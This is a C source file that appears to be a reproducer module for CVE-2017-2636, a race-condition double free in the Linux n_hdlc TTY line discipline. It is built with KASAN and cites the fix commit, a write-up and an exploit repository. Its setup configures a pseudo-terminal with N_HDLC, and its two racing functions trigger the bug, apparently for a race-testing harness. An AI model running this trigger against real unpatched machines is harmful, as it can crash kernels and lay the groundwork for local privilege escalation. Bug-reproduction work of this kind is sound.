/*
[COMMIT]
fix: 82f2341c94d2
parent: c1ae3cfa0e8 

[COMPILE]
compiled with GCC 6.5, defconfig, with KASAN

[REF]
https://a13xp0p0v.github.io/2017/03/24/CVE-2017-2636.html
https://github.com/snorez/exploits/blob/master/cve-2017-2636/cve-2017-2636.c
https://git.kernel.org/pub/scm/linux/kernel/git/gregkh/tty.git/commit/?h=tty-linus&id=82f2341c94d270421f383641b7cd670e474db56b
*/

#include <fcntl.h>
#include <stdio.h>
#include <unistd.h>
#include <sys/ioctl.h>
#include <linux/tty.h>
#include <termios.h>
#include <stdlib.h>
#include <string.h>

static int fd;

unsigned long racee_delay, racer_delay;

void do_setup(void)
{
    return;
}

void setup_one(void)
{
    int n_hdlc, ret;
    char buf[100];

    fd = open("/dev/ptmx", O_RDWR);
    if (fd < 0) {
        perror("[-] open ptmx failed");
        exit(-1);
    }

    n_hdlc = N_HDLC;
    ret = ioctl(fd, TIOCSETD, &n_hdlc);
    if (ret < 0) {
        perror("[-] ioctl 1 failed");
        exit(-1);
    }

    ret = ioctl(fd, TCXONC, TCOOFF);
    if (ret < 0) {
        perror("[-] ioctl 2 failed");
        exit(-1);
    }

    memset(buf, 'B', sizeof(buf));
    ret = write(fd, buf, sizeof(buf));
    if (ret != sizeof(buf)) {
        perror("[-] write failed");
        exit(-1);
    }
}

void sys_racee(void)
{
    ioctl(fd, TCFLSH, TCIOFLUSH);
}

void sys_racer(void)
{
    ioctl(fd, TCXONC, TCOON);
}

void cleanup_one(void)
{
    close(fd);
}

void do_cleanup(void)
{
    return;
}

int sanity_check(void)
{
    return 0;
}